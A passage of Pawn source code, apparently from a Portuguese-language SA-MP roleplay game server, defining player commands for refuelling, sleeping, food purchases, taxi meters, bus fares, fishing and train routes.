			else if(!strcmp(WE_GetString(gFile, "Membro9"), "Ninguem", true)) { WE_SetString(gFile, "Membro9", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro10"), "Ninguem", true)) { WE_SetString(gFile, "Membro10", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro11"), "Ninguem", true)) { WE_SetString(gFile, "Membro11", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro12"), "Ninguem", true)) { WE_SetString(gFile, "Membro12", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro13"), "Ninguem", true)) { WE_SetString(gFile, "Membro13", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro14"), "Ninguem", true)) { WE_SetString(gFile, "Membro14", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro15"), "Ninguem", true)) { WE_SetString(gFile, "Membro15", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro16"), "Ninguem", true)) { WE_SetString(gFile, "Membro16", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro17"), "Ninguem", true)) { WE_SetString(gFile, "Membro17", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro18"), "Ninguem", true)) { WE_SetString(gFile, "Membro18", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro19"), "Ninguem", true)) { WE_SetString(gFile, "Membro19", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro20"), "Ninguem", true)) { WE_SetString(gFile, "Membro20", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro21"), "Ninguem", true)) { WE_SetString(gFile, "Membro21", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro22"), "Ninguem", true)) { WE_SetString(gFile, "Membro22", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro23"), "Ninguem", true)) { WE_SetString(gFile, "Membro23", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro24"), "Ninguem", true)) { WE_SetString(gFile, "Membro24", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro25"), "Ninguem", true)) { WE_SetString(gFile, "Membro25", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro26"), "Ninguem", true)) { WE_SetString(gFile, "Membro26", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro27"), "Ninguem", true)) { WE_SetString(gFile, "Membro27", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro28"), "Ninguem", true)) { WE_SetString(gFile, "Membro28", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro29"), "Ninguem", true)) { WE_SetString(gFile, "Membro29", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro30"), "Ninguem", true)) { WE_SetString(gFile, "Membro30", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro31"), "Ninguem", true)) { WE_SetString(gFile, "Membro31", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro32"), "Ninguem", true)) { WE_SetString(gFile, "Membro32", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro33"), "Ninguem", true)) { WE_SetString(gFile, "Membro33", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro34"), "Ninguem", true)) { WE_SetString(gFile, "Membro34", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro35"), "Ninguem", true)) { WE_SetString(gFile, "Membro35", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro36"), "Ninguem", true)) { WE_SetString(gFile, "Membro36", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro37"), "Ninguem", true)) { WE_SetString(gFile, "Membro37", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro38"), "Ninguem", true)) { WE_SetString(gFile, "Membro38", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro39"), "Ninguem", true)) { WE_SetString(gFile, "Membro39", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro40"), "Ninguem", true)) { WE_SetString(gFile, "Membro40", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro41"), "Ninguem", true)) { WE_SetString(gFile, "Membro41", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro42"), "Ninguem", true)) { WE_SetString(gFile, "Membro42", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro43"), "Ninguem", true)) { WE_SetString(gFile, "Membro43", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro44"), "Ninguem", true)) { WE_SetString(gFile, "Membro44", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro45"), "Ninguem", true)) { WE_SetString(gFile, "Membro45", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro46"), "Ninguem", true)) { WE_SetString(gFile, "Membro46", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro47"), "Ninguem", true)) { WE_SetString(gFile, "Membro47", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro48"), "Ninguem", true)) { WE_SetString(gFile, "Membro48", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro49"), "Ninguem", true)) { WE_SetString(gFile, "Membro49", PlayerName(playerid)); }
			else if(!strcmp(WE_GetString(gFile, "Membro50"), "Ninguem", true)) { WE_SetString(gFile, "Membro50", PlayerName(playerid)); }
  			SendClientFormat(convidou[playerid], COR_AMARELO, "%s aceitou ser membro do seu clã!", PlayerName(playerid));
            SendClientFormat(playerid, COR_AMARELO, "%s você aceitou ser membro do clã %s", PlayerName(playerid), playerClan[convidou[playerid]]);
			msgcount[playerid] = -1;
			msgconvi[playerid] = 0;
			return 1;
		}*/
  		return 1;
  	}
	if(!strcmp(cmd, "/recusar", true))
	{
	    if(AceitarMorador[playerid] < 0 && AceitarContrato[playerid] != 1)
	    {
	        SendClientMessage(playerid, COR_ERRO, "Ninguém está lhe oferecendo nada!");
	        return 1;
	    }
		if(AceitarMorador[playerid] > 0)
  		{
			SendClientFormat(MoradorCasaID[playerid], 0xFFD39BAA, "%s recusou a moradia!", PlayerName(playerid));
			SendClientMessage(playerid, COR_AMARELOCLARO, "* Você recusou o convite de moradia!");
  		    KillTimer(T_Morador[playerid]);
			AceitarMorador[playerid] = 0;
			MoradorCasaID[playerid] = 0;
			return 1;
  		}
   		if(AceitarContrato[playerid] == 1)
  		{
  		    ContratoMsg[playerid] = 0;
  		    AceitarContrato[playerid] = 0;
  		    KillTimer(T_Contratado[playerid]);
  		    if(IsPlayerConnected(DonoEmpresa[playerid]))
  		    {
  		    	format(gstring, sizeof(gstring), "Você recusou trabalhar na empresa do(a) jogador(a) {FFFFFF}%s", PlayerName(DonoEmpresa[playerid]));
			 	SendClientMessage(playerid, COR_ERRO, gstring);
				format(gstring, sizeof(gstring), "O(A) jogador(a) %s recusou o contrato para trabalhar em sua empresa!", PlayerName(playerid));
			 	SendClientMessage(DonoEmpresa[playerid], COR_ERRO, gstring);
                DonoEmpresa[playerid] = -1;
				return 1;
			}
			SendClientMessage(playerid, COR_ERRO, "Você recusou o convite de trabalho!");
		 	DonoEmpresa[playerid] = -1;
			return 1;
  		}
		/*if(msgconvi[playerid] == 1)
        {
			format(pFile, sizeof(pFile), "clans/%s.ini", PlayerName(convidou[playerid]));
    		format(gFile, sizeof(gFile), "clans/%s.ini", WE_GetString(pFile, "cla"));
            SendClientFormat(convidou[playerid], COR_ERRO, "%s recusou ser membro do seu clã!", PlayerName(playerid));
            SendClientFormat(playerid, COR_BRANCO, "%s você recusou ser membro do clã %s", PlayerName(playerid), WE_GetString(pFile, "cla"));
			KillTimer(timercou[playerid]);
			msgcount[playerid] = -1;
			msgconvi[playerid] = 0;
			convidou[playerid] = -1;
			return 1;
		}*/
		return 1;
	}
	if(!strcmp(cmd, "/abastecer", true))
	{
	    if(AreaPosto[playerid] == true)
		{
		    tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /abastecer [Litros]");
	    	 	return 1;
			}
			new quantidade;
            quantidade = strval(tmp);
			if(quantidade > 100 || quantidade < 1)
				return SendClientMessage(playerid, COR_ERRO, "Quantidade inválida!");
			if(pInfo[playerid][Gas] >= 100)
				return SendClientMessage(playerid, COR_ERRO, "Seu tanque já está completo!");
			if(GetPlayerCash(playerid) < quantidade*2)
			    return SendClientMessage(playerid, COR_ERRO, "Você não tem a quantia necessária!");
			if(pInfo[playerid][Gas]+quantidade <= 100)
			{
			    new preco = quantidade*2;
	    		TogglePlayerControllable(playerid, true);
				pInfo[playerid][Gas] = quantidade;
				GivePlayerCash(playerid, -preco);
 				format(gStr, sizeof(gStr), "Abastecendo %d litros de combustivel...", quantidade);
				SendClientMessage(playerid, AZUL_WE, gStr);
			}
			else
			{
			    new precofull = 100-pInfo[playerid][Gas];
	    		TogglePlayerControllable(playerid, true);
	    		pInfo[playerid][Gas] = 100;
	    		GivePlayerCash(playerid, -precofull*2);
    			format(gStr, sizeof(gStr), "Abastecendo %d litros de combustivel...", precofull);
				SendClientMessage(playerid, AZUL_WE, gStr);
			}
			SetTimerEx("Abastecendo", 3000, false, "i", playerid);
			TogglePlayerControllable(playerid, false);
			return 1;
		}
 		else
		{
		   	SendClientMessage(playerid, COR_ERRO, "Você não está em um posto de combustível!");
		}
		return 1;
	}
	if(!strcmp(cmd, "/nickpreto", true))
	{
		if(aInfo[playerid][Admin] == 1)
		{
			new
				id
			;
			tmp = strtok(cmdtext, idx);
			id = strval(tmp);
			ShowPlayerNameTagForPlayer(id, id, 1);
			SetPlayerMarkerForPlayer(id, id, SetColor(id));
			return 1;
		}
	}
	if(!strcmp(cmd, "/combustivel", true))
	{
		if(aInfo[playerid][Admin] == 1)
		{
			new
				id,
				quantidade
			;
			tmp = strtok(cmdtext, idx);
  			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /combustivel [ID] [Litros]");
	    	 	return 1;
			}
	    	id = strval(tmp);
	    	tmp = strtok(cmdtext, idx);
	    	if(!IsPlayerConnected(id))
	    	{
	    	    SendClientMessage(playerid, COR_BRANCO, "Jogador(a) não conectado(a)!");
	    	    return 1;
	    	}
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /combustivel [ID] [Litros]");
	    	 	return 1;
			}
	    	quantidade = strval(tmp);
			if(quantidade > 100 || quantidade < 1)
				return SendClientMessage(playerid, COR_ERRO, "Quantidade inválida!");
			if(pInfo[id][Gas] >= 100)
				return SendClientMessage(playerid, COR_ERRO, "Seu tanque já está completo!");
			format(gStr, sizeof(gStr), "O(A) administrador(a) '%s' colocou para você '%d' litros de combustivel.", PlayerName(playerid), quantidade);
			SendClientMessage(id, COR_AMARELO, gStr);
  			format(gStr, sizeof(gStr), "Você colocou '%d' litros de combustivel para '%s'.", quantidade, PlayerName(id));
			SendClientMessage(playerid, COR_AMARELO, gStr);
			pInfo[id][Gas] = quantidade;
			return 1;
		}
		else
		{
		   	SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
	    	return 1;
		}
	}

//----------------------------- FomeSedeSono -----------------------------------
	if(!strcmp(cmd, "/dormir", true))
	{
		if(GetPVarInt(playerid,"Sono") >= 75) return SendClientMessage(playerid, COR_ERRO,"Você não esta com sono!");
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 514)
		{
		    TogglePlayerControllable(playerid, true);
		    SetPlayerDrunkLevel(playerid, 0);
		    KillTimer(ContagemSono[playerid]);
		    TogglePlayerControllable(playerid, false);
		    SendClientMessage(playerid, 0xDCDCDCFF, "Aguarde 1 minuto para acordar!");
		    SetTimerEx("AcordarCaminhao", 60000, false, "i", playerid);
		    return 1;
		}
	    if(pInfo[playerid][Casa] > 0)
	    {
	       if(!(IsPlayerInRangeOfPoint(playerid, 3.0, 232.0407,1287.1119,1082.8839) || IsPlayerInRangeOfPoint(playerid, 3.0, 266.4384,1287.9473,1080.9987) || IsPlayerInRangeOfPoint(playerid, 3.0, 140.3395,1386.1359,1084.5214)
	        || IsPlayerInRangeOfPoint(playerid, 3.0, 135.6128,1385.3220,1089.0525) || IsPlayerInRangeOfPoint(playerid, 3.0, 152.3840,1376.2253,1089.0525) || IsPlayerInRangeOfPoint(playerid, 3.0, 147.9311,1385.3346,1089.0525)
	        || IsPlayerInRangeOfPoint(playerid, 3.0, 77.9491,1337.6481,1089.0231) || IsPlayerInRangeOfPoint(playerid, 3.0, 92.2879,1340.6649,1089.0265) || IsPlayerInRangeOfPoint(playerid, 3.0, 2342.0837,-1067.7916,1049.7074)
	        || IsPlayerInRangeOfPoint(playerid, 3.0, 2188.1179,-1210.1270,1049.7090) || IsPlayerInRangeOfPoint(playerid, 3.0, 2359.2795,-1132.7079,1051.4023) || IsPlayerInRangeOfPoint(playerid, 3.0, 2362.6367,-1122.4609,1051.5746)
	        || IsPlayerInRangeOfPoint(playerid, 3.0, 2198.5737,-1214.2178,1049.5664) || IsPlayerInRangeOfPoint(playerid, 3.0, 2187.7866,-1219.2948,1049.7371) || IsPlayerInRangeOfPoint(playerid, 3.0, 2258.2498,-1223.5747,1049.7917)
	        || IsPlayerInRangeOfPoint(playerid, 3.0, 2209.8884,-1071.9370,1051.3308) || IsPlayerInRangeOfPoint(playerid, 3.0, 2206.5239,-1071.9524,1051.3308) || IsPlayerInRangeOfPoint(playerid, 3.0, 2244.0154,-1080.1523,1049.5619)
	        || IsPlayerInRangeOfPoint(playerid, 3.0, 237.4120,1029.6683,1088.8088) || IsPlayerInRangeOfPoint(playerid, 3.0, 241.1674,1034.8560,1088.7943) || IsPlayerInRangeOfPoint(playerid, 3.0, 238.1896,1050.1255,1084.4961)
	        || IsPlayerInRangeOfPoint(playerid, 3.0, 228.5271,1050.1365,1084.4961) || IsPlayerInRangeOfPoint(playerid, 3.0, -275.3728,1448.5557,1089.4170) || IsPlayerInRangeOfPoint(playerid, 3.0, 225.8938,1251.3134,1082.8237)
	        || IsPlayerInRangeOfPoint(playerid, 3.0, 2241.5056,-1080.2970,1049.5619) || IsPlayerInRangeOfPoint(playerid, 3.0, 2326.3772,-1008.4699,1055.2461) || IsPlayerInRangeOfPoint(playerid, 3.0, 2285.1965,-1135.2899,1051.5265)))
	        {
	            SendClientMessage(playerid, COR_ERRO,"Você não está em uma cama!");
	            return 1;
	        }
	    }
	    else
	    {
	        if(Alugou[playerid] == false) return SendClientMessage(playerid, COR_ERRO, "Você não tem casa e não alugou um quarto!");
	        if(!(IsPlayerInRangeOfPoint(playerid, 3.0, 2246.6145,-1164.8956,1030.4943) || IsPlayerInRangeOfPoint(playerid, 3.0, 2235.8782,-1154.6770,1030.4943) || IsPlayerInRangeOfPoint(playerid, 3.0, 2235.8779,-1165.6445,1030.4943)
	        || IsPlayerInRangeOfPoint(playerid, 3.0, 2230.8008,-1183.2682,1030.5249) || IsPlayerInRangeOfPoint(playerid, 3.0, 2204.7166,-1193.9952,1030.5249) || IsPlayerInRangeOfPoint(playerid, 3.0, 2198.3706,-1178.1284,1030.4943)
	        || IsPlayerInRangeOfPoint(playerid, 3.0, 2187.9197,-1152.1074,1030.4943) || IsPlayerInRangeOfPoint(playerid, 3.0, 2198.4790,-1162.3024,1030.4943)))
	        {
	            SendClientMessage(playerid, COR_ERRO,"Você não está em uma cama!");
	            return 1;
	        }
	    }
	    TogglePlayerControllable(playerid, true);
	    SetPlayerDrunkLevel(playerid, 0);
	    ApplyAnimation(playerid,"CRACK","crckdeth4",4.0,0,0,0,1,0);
	    KillTimer(ContagemSono[playerid]);
	    TogglePlayerControllable(playerid, false);
	    SendClientMessage(playerid, 0xDCDCDCFF, "Aguarde 1 minuto para acordar!");
	    SetTimerEx("Acordar", 60000, false, "i", playerid);
	    return 1;
	}
	if(!strcmp(cmd, "/cardapio", true))
	{
		new nomecheck = CPS_GetPlayerCheckpoint(playerid);
		if(nomecheck == BS10 || nomecheck == RBD17 || nomecheck == CB9 || nomecheck == WSP5 || nomecheck == JD4)
		{

			ShowPlayerDialog(playerid, D_CARDAPIO, DIALOG_STYLE_LIST, "Cardápio - Lanchonete","- Bebidas\n\n- Bebidas Alcoólica\n\n- Comidas\n\n- Lanches\n", "Comprar", "Cancelar");
			return 1;
		}
		else
		{

			SendClientMessage(playerid, COR_VERMELHOCLARO, "Você não está em uma Lanchonete!");
			return 1;
		}
	}
	if(!strcmp(cmd, "/alugarq", true))
	{
		new nomecheck = CPS_GetPlayerCheckpoint(playerid);
		if(nomecheck == ZEU)
		{

			ShowPlayerDialog(playerid, D_TEST, DIALOG_STYLE_MSGBOX,"Hotel","Deseja mesmo alugar um quarto?", "Alugar","Cancelar");
			return 1;
		}
		else
		{

			SendClientMessage(playerid, COR_VERMELHOCLARO, "Você não está em uma Casa/Hotel!");
			return 1;
		}
	}
//---------------------------------- FSS ---------------------------------------
/*----------------------------- DriveThru ------------------------------------*/
	if(strcmp("/dvs", cmdtext, true, 10) == 0)
	{

		if(aInfo[playerid][Admin] == 0) return SendClientMessage(playerid, 0xFF0000FF,"Você não tem permissão!");
		ShowPlayerDialog(playerid, DVS, DIALOG_STYLE_LIST, "Drive Thru","LS - Drive Thru\nLS[2] - Drive Thru\nLS[3] - Drive Thru\nSF - Drive Thru\nLV - Drive Thru\nLV[2] - Drive Thru\n", "Selecionar", "Cancelar");
		return 1;
	}
	if (strcmp("/drivethru", cmdtext, true, 10) == 0)
	{
		if(!IsPlayerInAnyVehicle(playerid))
		{
			SendClientMessage(playerid, VERMELHO, "Você não está em um veículo!");
			return 1;
		}
		if(IsPlayerInRangeOfPoint(playerid, 5.0, 2401.9275,-1506.4696,23.3550) || IsPlayerInRangeOfPoint(playerid, 5.0, 1179.7521,-902.8798,42.8330)
		|| IsPlayerInRangeOfPoint(playerid, 5.0, 800.5552,-1629.6398,12.9030) || IsPlayerInRangeOfPoint(playerid, 5.0, 1857.3107,2081.2676,10.3387)
		|| IsPlayerInRangeOfPoint(playerid, 5.0, 2486.0686,2022.3807,10.3402) || IsPlayerInRangeOfPoint(playerid, 5.0, -2350.0037,-155.5846,34.8405))
		ShowPlayerDialog(playerid, DriveThru, DIALOG_STYLE_LIST, "Cardápio - Drive-Thru","- Bebida\n\n- Lanche", "Comprar", "Cancelar");
		return 1;
 	}
/*----------------------------- DriveThru ------------------------------------*/
  	if(!strcmp(cmd, "/passagem", true))
  	{
  	    if(pInfo[playerid][Prof] == MOTORISTA_ONIBUS)
  	    {
			tmp = strtok(cmdtext, idx);
        	if(!strlen(tmp))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /Passagem [ID]");
				return 1;
			}
			new id = strval(tmp);
			if(!IsPlayerConnected(id))
			{
				SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
				return 1;
			}
			if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
			{
			    if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 431)
			    {
			        if(GetPlayerVehicleID(id) == GetPlayerVehicleID(playerid))
			        {
			            if(GetPlayerCash(id) >= 50)
			            {
							SendClientFormat(playerid, COR_AZULBEBE, "Você recebeu R$50 da passagem do(a) jogador(a) %d.", PlayerName(id));
							SendClientFormat(id, COR_AZULBEBE, "O motorista %s cobrou R$50 pela passagem.", PlayerName(playerid));
						}
						else
						{
						    SendClientMessage(playerid, COR_ERRO, "O passageiro não tinha o dinheiro da passagem e foi deixado neste local!");
						    SendClientMessage(id, COR_ERRO, "Você não tinha dinheiro suficiente para passagem e foi deixado aqui!");
						    RemovePlayerFromVehicle(id);
						}
					}
					else
					{
					    SendClientMessage(playerid, COR_ERRO, "Este jogador não está no Ônibus.");
					    return 1;
					}
				}
				else
				{
				    SendClientMessage(playerid, COR_ERRO, "Você não está em um Ônibus.");
				    return 1;
				}
			}
			else
			{
   				SendClientMessage(playerid, COR_ERRO, "Você não está dirigindo um Ônibus.");
				return 1;
			}
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não é Motorista de Ônibus.");
			return 1;
		}
		return 1;
	}
	if(!strcmp(cmd, "/taximetro", true))
	{
	    if(Taxista_P[playerid] == 1)
	    {
	        SendClientMessage(playerid, COR_ERRO, "Você não pode iniciar o taximetro novamente, pois você já está com um cliente no veículo!");
	        return 1;
	    }
 		tmp = strtok(cmdtext, idx);
   		if(!strlen(tmp))
     	{
     	    if(pInfo[playerid][Prof] == TAXISTA)
			 	return SendClientMessage(playerid, COR_ERRO, "Uso válido: /Taximetro Carro");
     	    if(pInfo[playerid][Prof] == MOTO_TAXISTA)
			 	return SendClientMessage(playerid, COR_ERRO, "Uso válido: /Taximetro Moto");
     	    if(pInfo[playerid][Prof] == PILOTO_PART)
			 	return SendClientMessage(playerid, COR_ERRO, "Você não é um(a) Taxista!");
      	}
       	else if(!strcmp(tmp, "carro", true))
       	{
	        if(pInfo[playerid][Prof] == TAXISTA || aInfo[playerid][Admin] == 1)
	        {
	            tmp = strtok(cmdtext, idx);
	            if(!strlen(tmp))
	            {
					SendClientMessage(playerid, COR_ERRO, "Uso válido: /Taximetro Carro [ID]");
					return 1;
	            }
	            new
					id = strval(tmp)
				;
   	            if(!IsPlayerConnected(id))
	            {
					SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
					return 1;
	            }
	            if(playerid == id)
	            {
		            SendClientMessage(playerid, COR_ERRO, "Você não pode iniciar o taximetro para você mesmo!");
					return 1;
				}
	            if(GetPlayerCash(id) < 20)
	            {
	                SendClientMessage(playerid, COR_ERRO, "O(A) jogador(a) selecionado(a) não tem em mãos o valor de R$20 para iniciar o taximetro!");
	                return 1;
				}
				if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 420)
	            {
	            	if(GetPlayerVehicleID(playerid) == GetPlayerVehicleID(id) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	            	{
	                	SendClientMessage(playerid, COR_AMARELO, "O taxímetro foi iniciado já com o valor de R$20 na bandeirada inicial!");
	                	SendClientMessage(id, COR_AMARELO, "O taxímetro foi iniciado já com o valor de R$20 na bandeirada inicial!");
                        Taxista_P[playerid] = 1;
						Taximetro[id][1] = 1;
	                	Taximetro[id][2] = playerid;
	                	T_Taximetro[id] = SetTimerEx("RodarTaximetro", 10000, true, "d", id);
					}
					else
					{
					    SendClientMessage(playerid, COR_ERRO, "O passageiro não está em seu veículo ou você não está em um táxi!");
					}
					return 1;
	            }
	            else
	            {
				    SendClientMessage(playerid, COR_ERRO, "Você precisa estar em um táxi para poder iniciar o taximetro!");
	            }
	            return 1;
			}
	        else
	        {
	            SendClientMessage(playerid, COR_ERRO, "Você não é um(a) Taxista!");
	        }
	        return 1;
	    }
		else if(!strcmp(tmp, "moto", true))
       	{
	        if(pInfo[playerid][Prof] == MOTO_TAXISTA || aInfo[playerid][Admin] == 1)
	        {
	            tmp = strtok(cmdtext, idx);
	            if(!strlen(tmp))
	            {
					SendClientMessage(playerid, COR_ERRO, "Uso válido: /Taximetro Moto [ID]");
					return 1;
	            }
	            new
					id = strval(tmp)
				;
   	            if(!IsPlayerConnected(id))
	            {
					SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
					return 1;
	            }
	            if(playerid == id)
	            {
		            SendClientMessage(playerid, COR_ERRO, "Você não pode iniciar o taximetro para você mesmo!");
					return 1;
				}
	            if(GetPlayerCash(id) < 20)
	            {
	                SendClientMessage(playerid, COR_ERRO, "O(A) jogador(a) selecionado(a) não tem em mãos o valor de R$20 para iniciar o taximetro!");
	                return 1;
				}
				if(GetPlayerVehicleID(playerid) == vMotoTaxista[0] || GetPlayerVehicleID(playerid) == vMotoTaxista[1] || GetPlayerVehicleID(playerid) == vMotoTaxista[2])
	            {
	            	if(GetPlayerVehicleID(playerid) == GetPlayerVehicleID(id) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	            	{
	                	SendClientMessage(playerid, COR_AMARELO, "O taxímetro foi iniciado já com o valor de R$20 na bandeirada inicial!");
	                	SendClientMessage(id, COR_AMARELO, "O taxímetro foi iniciado já com o valor de R$20 na bandeirada inicial!");
                        Taxista_P[playerid] = 1;
						Taximetro[id][1] = 1;
	                	Taximetro[id][2] = playerid;
	                	T_Taximetro[id] = SetTimerEx("RodarTaximetro", 10000, true, "d", id);
					}
					else
					{
					    SendClientMessage(playerid, COR_ERRO, "O passageiro não está em seu veículo ou você não está em uma moto táxi!");
					}
					return 1;
	            }
	            else
	            {
				    SendClientMessage(playerid, COR_ERRO, "Você precisa estar em uma moto táxi para poder iniciar o taximetro!");
	            }
	            return 1;
			}
	        else
	        {
	            SendClientMessage(playerid, COR_ERRO, "Você não é um(a) Moto Taxista!");
	        }
	        return 1;
	    }
		return 1;
	}
	if(!strcmp(cmdtext, "/jogarrede", true))
	{
    	if(pInfo[playerid][Prof] == PESCADOR || aInfo[playerid][Admin] == 1)
    	{
			if(!IsPlayerInPlace(playerid, 385.345092, -2512.000000, 529.345092, -2368.000000))
	     	{
	            SendClientMessage(playerid, COR_ERRO, "Você não está na área de pesca!");
	            return 1;
	     	}
   			if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 453)
			{
				SendClientMessage(playerid, COR_ERRO, "Você deve estar dentro de um Reefer para poder pescar!");
				return 1;
			}
	    	if(JaPescando[playerid] == 1)
			{
		        SendClientMessage(playerid, COR_ERRO, "Você já está pescando!");
		        return 1;
			}
			new
			 	pxQuantia = WE_GetInt(f(playerid), "Peixes")
	 		;
	 		if(pxQuantia >= 15)
	 		{
	 		    SendClientMessage(playerid, COR_ERRO, "Você já atingiu o limite máximo de peixes!");
	 		    SendClientMessage(playerid, COR_ERRO, "O limite máximo de peixes é de 15!");
	 		    return 1;
	 		}
			SendClientMessage(playerid, COR_BRANCO, "Rede de pesca lançada.");
			SendClientMessage(playerid, COR_BRANCO, "Espere a rede voltar para lançá-la novamente...");
			JaPescando[playerid] = 1;
			wepCount[playerid] = 30;
			Pescando[playerid] = SetTimerEx("Pescou", 1000, false, "d", playerid);
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não é um(a) pescador(a)!");
		}
		return 1;
	}
	if(!strcmp(cmd, "/venderpescas", true))
	{
 		if(pInfo[playerid][Prof] == PESCADOR || aInfo[playerid][Admin] == 1)
		{
		    if(!PlayerToPoint(2.0, playerid, 446.9114, -1875.3275, 4.3723))
	    	{
	            SendClientMessage(playerid, COR_ERRO, "Você não está na cooperativa de pesca!");
	            return 1;
	     	}
	     	new
			 	pxQuantia = WE_GetInt(f(playerid), "Peixes")
	 		;
	      	if(pxQuantia <= 0)
	  		{
		    	SendClientMessage(playerid, COR_ERRO, "Você não tem nenhuma pesca!");
		    	SendClientMessage(playerid, COR_ERRO, "Você precisa ter o total de 15 pescas para poder vende-las!");
		      	return 1;
			}
			if(pxQuantia > 0 && pxQuantia < 15)
	  		{
	  		    format(gStr, sizeof(gStr), "Você só tem apenas %d peixes!", pxQuantia);
		    	SendClientMessage(playerid, COR_ERRO, gStr);
		    	SendClientMessage(playerid, COR_ERRO, "Você precisa ter o total de 15 pescas para poder vende-las!");
		      	return 1;
			}
			if(pxQuantia >= 15)
			{
				format(gstring, sizeof(gstring), "{00CCFF} {FFFFFF}\tCooperativa de Pescas\n\nTotal de peixes: {48F600}15\nPreço por peixe: {48F600}R$80\nValor total: {48F600}R$1200\nPago: {48F600}Sim");
				ShowPlayerDialog(playerid, D_PESCAD, DIALOG_STYLE_MSGBOX, "{00CCFF}{FFFFFF} Info venda pesca", gstring, "OK", "");
				sGivePlayerCash(playerid, 1200);
				WE_SetInt(f(playerid), "Peixes", 0);
				return 1;
			}
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não é um(a) pescador(a)!");
		}
		return 1;
	}
	if(!strcmp(cmd, "/sairestacao", true))
	{
     	if(IsPlayerInDynamicCP(playerid, CP_9))
     	{
		    if(pInfo[playerid][Prof] == MAQUINISTA)
		    {
			    if(CargaEstacaoLS[playerid] == 1)
			    {
			        SendClientMessage(playerid, COR_ERRO, "Você já iniciou a saída de seu trem!");
			        return 1;
				}
		 		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 538)
				{
					SendClientMessage(playerid, COR_AMARELO, "Vá até estação de Las Venturas, ao chegar lá digite: /chegadalv");
					CargaEstacaoLS[playerid] = 1;
					CargaEstacaoLV[playerid] = 0;
					CargaEstacaoSF[playerid] = 0;
					return 1;
				}
				else
				{
				    SendClientMessage(playerid, COR_ERRO, "Você não está em um trem streak!");
				    return 1;
				}
			}
			else
			{
				SendClientMessage(playerid, COR_ERRO, "Você não é um(a) maquinista!");
				return 1;
			}
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não está dentro da área vermelha!");
		    return 1;
		}
	}
	if(!strcmp(cmd, "/chegadalv", true))
	{
     	if(IsPlayerInDynamicCP(playerid, CP_10))
     	{
		    if(pInfo[playerid][Prof] == MAQUINISTA)
		    {
			    if(CargaEstacaoLS[playerid] == 0)
			    {
			        SendClientMessage(playerid, COR_ERRO, "Você não iniciou a saída de seu trem em Los Santos!");
			        return 1;
				}
			    if(CargaEstacaoLV[playerid] == 1)
			    {
			        SendClientMessage(playerid, COR_ERRO, "Você já iniciou a saída de seu trem de Las Venturas!");
			        return 1;
				}
		 		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 538)
